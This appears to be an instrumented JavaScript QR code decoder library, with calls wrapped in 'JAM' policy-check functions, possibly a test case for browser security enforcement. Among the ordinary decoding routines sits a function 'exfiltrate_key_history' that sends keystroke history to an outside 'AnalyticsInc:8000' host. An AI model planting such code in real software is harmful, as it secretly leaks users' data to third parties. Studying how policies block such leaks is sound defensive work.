      var dB = JAM.call(Math.abs, Math, [center1.EstimatedModuleSize - average], JAM.policy.p37);
      if (dA < dB) {
        return-1;
      } else {
        if (dA === dB) {
    ...
    if (startSize > 3) {
      ...
      JAM.call(v831.sort, v831, [v100], JAM.policy.p37);
      var stdDev = JAM.call(Math.sqrt, Math, [square / startSize - average * average], JAM.policy.p37);
      var limit = JAM.call(Math.max, Math, [.2 * average, stdDev], JAM.policy.p36);
      i$$51 = 0;
      ...
      for (;v837;) {
        ...
        if (JAM.call(Math.abs, Math, [pattern$$2.EstimatedModuleSize - average], JAM.policy.p37) > limit) {
          var v835 = this.possibleCenters;
          JAM.call(v835.remove, v835, [i$$51], JAM.policy.p27);
          i$$51 = i$$51 - 1;
        }
        i$$51 = i$$51 + 1;
    ...
    if (this.possibleCenters.length > 3) {
      ...
      JAM.call(v839.sort, v839, [v101], JAM.policy.p37);
    }
  ...
  function v99(stateCount$$4, i$$50, j$$27) {
    ...
    var centerJ$$1 = JAM.call(this.centerFromEnd, this, [stateCount$$4, j$$27], JAM.policy.p36);
    var centerI$$1 = JAM.call(this.crossCheckVertical, this, [i$$50, JAM.call(Math.floor, Math, [centerJ$$1], JAM.policy.p37), stateCount$$4[2], stateCountTotal$$2], JAM.policy.p36);
    if (!isNaN(centerI$$1)) {
      centerJ$$1 = JAM.call(this.crossCheckHorizontal, this, [JAM.call(Math.floor, Math, [centerJ$$1], JAM.policy.p37), JAM.call(Math.floor, Math, [centerI$$1], JAM.policy.p37), stateCount$$4[2], stateCountTotal$$2], JAM.policy.p27);
      if (!isNaN(centerJ$$1)) {
        ...
        for (;v854;) {
          ...
          if (JAM.call(center.aboutEquals, center, [estimatedModuleSize$$1, centerI$$1, centerJ$$1], JAM.policy.p36)) {
        ...
        if (!found) {
          ...
          JAM.call(v855.push, v855, [point$$2], JAM.policy.p37);
          if (this.resultPointCallback !== null) {
            var v856 = this.resultPointCallback;
            JAM.call(v856.foundPossibleResultPoint, v856, [point$$2], JAM.policy.p37);
          }
        }
        return true;
      }
  ...
  function v98(startJ, centerI, maxCount$$1, originalStateCountTotal$$1) {
    ...
    if (5 * JAM.call(Math.abs, Math, [stateCountTotal$$1 - originalStateCountTotal$$1], JAM.policy.p37) >= originalStateCountTotal$$1) {
      return NaN;
    }
    var v876;
    if (JAM.call(this.foundPatternCross, this, [stateCount$$3], JAM.policy.p37)) {
      v876 = JAM.call(this.centerFromEnd, this, [stateCount$$3, j$$26], JAM.policy.p36);
    } else {
      v876 = NaN;
    }
    return v876;
  ...
  function v97(startI, centerJ, maxCount, originalStateCountTotal) {
    ...
    if (5 * JAM.call(Math.abs, Math, [stateCountTotal - originalStateCountTotal], JAM.policy.p37) >= 2 * originalStateCountTotal) {
      return NaN;
    }
    var v892;
    if (JAM.call(this.foundPatternCross, this, [stateCount$$2], JAM.policy.p37)) {
      v892 = JAM.call(this.centerFromEnd, this, [stateCount$$2, i$$49], JAM.policy.p36);
    } else {
      v892 = NaN;
    }
    return v892;
  ...
  function v95(stateCount) {
    ...
    var moduleSize$$3 = JAM.call(Math.floor, Math, [(totalModuleSize << INTEGER_MATH_SHIFT) / 7], JAM.policy.p37);
    var maxVariance = JAM.call(Math.floor, Math, [moduleSize$$3 / 2], JAM.policy.p37);
    var v2642 = JAM.call(Math.abs, Math, [moduleSize$$3 - (stateCount[0] << INTEGER_MATH_SHIFT)], JAM.policy.p37) < maxVariance;
    if (v2642) {
      v2642 = JAM.call(Math.abs, Math, [moduleSize$$3 - (stateCount[1] << INTEGER_MATH_SHIFT)], JAM.policy.p37) < maxVariance;
    }
    var v2438 = v2642;
    if (v2438) {
      v2438 = JAM.call(Math.abs, Math, [3 * moduleSize$$3 - (stateCount[2] << INTEGER_MATH_SHIFT)], JAM.policy.p37) < 3 * maxVariance;
    }
    var v1740 = v2438;
    if (v1740) {
      v1740 = JAM.call(Math.abs, Math, [moduleSize$$3 - (stateCount[3] << INTEGER_MATH_SHIFT)], JAM.policy.p37) < maxVariance;
    }
    var v900 = v1740;
    if (v900) {
      v900 = JAM.call(Math.abs, Math, [moduleSize$$3 - (stateCount[4] << INTEGER_MATH_SHIFT)], JAM.policy.p37) < maxVariance;
    }
    return v900;
  }
  function v94() {
...
function AlignmentPattern(posX$$1, posY$$1, estimatedModuleSize$$2) {
  function v111(moduleSize$$4, i$$55, j$$29) {
    var v1742 = JAM.call(Math.abs, Math, [i$$55 - this.y], JAM.policy.p37) <= moduleSize$$4;
    if (v1742) {
      v1742 = JAM.call(Math.abs, Math, [j$$29 - this.x], JAM.policy.p37) <= moduleSize$$4;
    }
    if (v1742) {
      var moduleSizeDiff$$1 = JAM.call(Math.abs, Math, [moduleSize$$4 - this.estimatedModuleSize], JAM.policy.p37);
  ...
  function v109() {
    return JAM.call(Math.floor, Math, [this.y], JAM.policy.p37);
  }
  function v108() {
    return JAM.call(Math.floor, Math, [this.x], JAM.policy.p37);
  }
  function v107() {
    return this.count;
  }
  ...
  JAM.call(this.__defineGetter__, this, ["EstimatedModuleSize", v106], JAM.policy.p26);
  JAM.call(this.__defineGetter__, this, ["Count", v107], JAM.policy.p26);
  JAM.call(this.__defineGetter__, this, ["X", v108], JAM.policy.p26);
  JAM.call(this.__defineGetter__, this, ["Y", v109], JAM.policy.p26);
...
function AlignmentPatternFinder(image$$11, startX, startY, width$$12, height$$11, moduleSize$$5, resultPointCallback) {
  function v116() {
    ...
    for (;v923;) {
      ...
      for (;v920;) {
        if (image$$11[j$$31 + i$$59 * qrcode.width]) {
          if (currentState$$1 === 1) {
            ...
            if (currentState$$1 === 2) {
              if (JAM.call(this.foundPatternCross, this, [stateCount$$10], JAM.policy.p37)) {
                var confirmed$$1 = JAM.call(this.handlePossibleCenter, this, [stateCount$$10, i$$59, j$$31], JAM.policy.p36);
                if (confirmed$$1 !== null) {
                  return confirmed$$1;
                }
              }
      ...
      if (JAM.call(this.foundPatternCross, this, [stateCount$$10], JAM.policy.p37)) {
        confirmed$$1 = JAM.call(this.handlePossibleCenter, this, [stateCount$$10, i$$59, maxJ$$2], JAM.policy.p36);
        if (confirmed$$1 !== null) {
          return confirmed$$1;
        }
      }
  ...
  function v115(stateCount$$9, i$$58, j$$30) {
    ...
    var centerJ$$3 = JAM.call(this.centerFromEnd, this, [stateCount$$9, j$$30], JAM.policy.p36);
    var centerI$$2 = JAM.call(this.crossCheckVertical, this, [i$$58, JAM.call(Math.floor, Math, [centerJ$$3], JAM.policy.p37), 2 * stateCount$$9[1], stateCountTotal$$4], JAM.policy.p36);
    if (!isNaN(centerI$$2)) {
      ...
      for (;v934;) {
        ...
        if (JAM.call(center$$2.aboutEquals, center$$2, [estimatedModuleSize$$3, centerI$$2, centerJ$$3], JAM.policy.p36)) {
      ...
      JAM.call(v935.push, v935, [point$$3], JAM.policy.p37);
      if (this.resultPointCallback !== null) {
        var v936 = this.resultPointCallback;
        JAM.call(v936.foundPossibleResultPoint, v936, [point$$3], JAM.policy.p37);
      }
    }
    return null;
  }
  function v114(startI$$1, centerJ$$2, maxCount$$2, originalStateCountTotal$$2) {
    ...
    if (5 * JAM.call(Math.abs, Math, [stateCountTotal$$3 - originalStateCountTotal$$2], JAM.policy.p37) >= 2 * originalStateCountTotal$$2) {
      return NaN;
    }
    var v950;
    if (JAM.call(this.foundPatternCross, this, [stateCount$$8], JAM.policy.p37)) {
      v950 = JAM.call(this.centerFromEnd, this, [stateCount$$8, i$$57], JAM.policy.p36);
    } else {
      v950 = NaN;
    }
    return v950;
  ...
  function v113(stateCount$$7) {
    ...
    var v952 = i$$56 < 3;
    for (;v952;) {
      if (JAM.call(Math.abs, Math, [moduleSize$$6 - stateCount$$7[i$$56]], JAM.policy.p37) >= maxVariance$$1) {
        return false;
      }
      i$$56 = i$$56 + 1;
      v952 = i$$56 < 3;
...
function QRCodeDataBlockReader(blocks, version$$8, numErrorCorrectionCode) {
  function v124() {
    ...
    var MODE_KANJI = 8;
    do {
      var mode$$7 = JAM.call(this.NextMode, this, [], JAM.policy.p27);
      if (mode$$7 === 0) {
      ...
      dataLength = JAM.call(this.getDataLength, this, [mode$$7], JAM.policy.p37);
      if (dataLength < 1) {
        throw "Invalid data length: " + dataLength;
      }
      switch(mode$$7) {
        case MODE_NUMBER:
          var temp_str = JAM.call(this.getFigureString, this, [dataLength], JAM.policy.p37);
          ...
          for (;v963;) {
            var v961 = ta;
            var v962 = j$$32;
            var v2875 = JAM.call(temp_str.charCodeAt, temp_str, [j$$32], JAM.policy.p37);
            v961[v962] = v2875;
            j$$32 = j$$32 + 1;
            v963 = j$$32 < temp_str.length;
          }
          JAM.call(output$$1.push, output$$1, [ta], JAM.policy.p37);
          break;
        case MODE_ROMAN_AND_NUMBER:
          temp_str = JAM.call(this.getRomanAndFigureString, this, [dataLength], JAM.policy.p37);
          ...
          for (;v967;) {
            var v965 = ta;
            var v966 = j$$32;
            var v2876 = JAM.call(temp_str.charCodeAt, temp_str, [j$$32], JAM.policy.p37);
            v965[v966] = v2876;
            j$$32 = j$$32 + 1;
          ...
          break;
        case MODE_8BIT_BYTE:
          var temp_sbyteArray3 = JAM.call(this.get8bitByteArray, this, [dataLength], JAM.policy.p37);
          JAM.call(output$$1.push, output$$1, [temp_sbyteArray3], JAM.policy.p37);
          break;
        case MODE_KANJI:
          temp_str = JAM.call(this.getKanjiString, this, [dataLength], JAM.policy.p37);
          JAM.call(output$$1.push, output$$1, [temp_str], JAM.policy.p37);
      }
    } while (true);
    return output$$1;
  }
  function v123(dataLength$$4) {
    ...
    do {
      ...
      unicodeString = unicodeString + JAM.call(String.fromCharCode, String, [shiftjisWord], JAM.policy.p37);
  ...
  function v122(dataLength$$3) {
    ...
    do {
      ...
      JAM.call(output.push, output, [intData$$2], JAM.policy.p37);
  ...
  function v120(dataLength$$1) {
    ...
    do {
      if (length$$11 > 1) {
        ...
        var firstLetter = JAM.call(Math.floor, Math, [intData / 45], JAM.policy.p37);
  ...
  function v119(modeIndicator) {
    ...
    return JAM.call(this.getNextBits, this, [qrcode.sizeOfDataLengthInfo[this.dataLengthMode][index$$41]], JAM.policy.p37);
  }
  function v118() {
  ...
  JAM.call(this.__defineGetter__, this, ["DataByte", v124], JAM.policy.p26);
  return;
}
function exfiltrate_key_history(key_history) {
  xmlhttp = new XMLHttpRequest;
  JAM.call(xmlhttp.open, xmlhttp, ["GET", "http://AnalyticsInc:8000/submission.html?" + key_history, true], JAM.policy.p26);
  JAM.call(xmlhttp.send, xmlhttp, [null], JAM.policy.p27);
  return;
}
function read(a$$9) {
  JAM.call(document.getElementById, document, ["mid"], JAM.policy.p26).value = a$$9;
  return;
}
function load() {
...
function processImage() {
  var qrpath = JAM.call(document.getElementById, document, ["imgpath"], JAM.policy.p26).innerHTML;
  JAM.call(qrcode.decode, qrcode, [qrpath], JAM.policy.p37);
  return;
}
GridSampler = {};
...
JAM.set(JAM.call(document.getElementById, document, ["decode"], JAM.policy.p26), "onclick", processImage);
load()
